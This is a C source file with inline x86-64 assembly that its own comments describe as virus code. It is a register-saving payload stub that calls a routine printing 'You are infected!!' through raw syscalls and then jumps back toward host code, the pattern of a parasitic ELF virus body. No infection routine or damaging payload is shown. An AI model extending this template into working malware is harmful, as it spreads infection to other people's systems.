// syscalls
long sys_write(long, char *, unsigned long);
int sys_fsync(int);
void sys_exit(long exit_code);
// libc
long long _strlen(char *);
int _puts(char *str);

void end_code();


_start() {
	__asm__ __volatile__ (
		".globl real_start	\n\t"
		"real_start:		\n\t" 
		"push %rsp			\n\t"
		"push %rbp			\n\t"
		"push %rax			\n\t"
		"push %rbx			\n\t"
		"push %rcx			\n\t"
		"push %rdx			\n\t"
		"push %r8			\n\t"
		"push %r9			\n\t"
		"push %r10			\n\t"
		"push %r11			\n\t"
		"push %r12			\n\t"
		"push %r13			\n\t"
		"push %r14			\n\t"
		"push %r15");
	
	/* Call virus code  */
	__asm__ __volatile__ (
		"call do_main");


	/* Restore registers after runing 
	 * virus exec code 
	 */
	__asm__ __volatile__ (
		"pop %r15			\n\t"
		"pop %r14			\n\t"
		"pop %r13			\n\t"
		"pop %r12			\n\t"
		"pop %r11			\n\t"
		"pop %r10			\n\t"
		"pop %r9			\n\t"
		"pop %r8			\n\t"
		"pop %rdx			\n\t"
		"pop %rcx			\n\t"
		"pop %rbx			\n\t"
		"pop %rbp			\n\t"
		"pop %rsp           \n\t"
		 /* Dealocate 8 bytes on stack 
		  * allocated by _start prologue
		  */
		"add $0x8, %rsp	\n\t"
		"jmp end_code");
}


do_main() {
	char payload_str[20] = {'Y', 'o', 'u', ' ', 'a', 'r', 'e', ' ', 'i', 'n', 'f', 'e', 'c', 't', 'e', 'd', '!', '!', '\n', '\0' };
	_puts(payload_str);
}

void sys_exit(long exit_code) {
	__asm__ __volatile__ (
		"mov %0, %%rdi		\n\t"
		"mov $0x3c, %%rax   \n\t"
		"syscall": /* Empty output */ : "r"(exit_code));
}
long sys_write(long fd, char * buf, unsigned long len) {
	long ret;
	__asm__ __volatile__(
		"mov %0, %%rdi		\n\t"
		"mov %1, %%rsi		\n\t"
		"mov %2, %%rdx		\n\t"
		"mov $1, %%rax		\n\t"
		"syscall" : : "g"(fd), "g"(buf), "g"(len));
	__asm__("mov %%rax, %0" : "=r"(ret));
	return ret;
}

int sys_fsync(int fd) {
	long ret;
	__asm__ __volatile__(
		"mov %0, %%rdi		\n\t"
		"mov $74, %%rax		\n\t"
		"syscall" : : "g"(fd));
	__asm__ ("mov %%rax, %0" : "=r"(ret));
	return (int)ret;
}

long long _strlen(char *s) { 
	long long sz;

	for (sz=0;s[sz];sz++);
	return sz;
}

int _puts(char *str) {
	sys_write(1, str, _strlen(str));
	sys_fsync(1);

	return 1;
}


void end_code() {
	__asm__ __volatile__("nop");
}

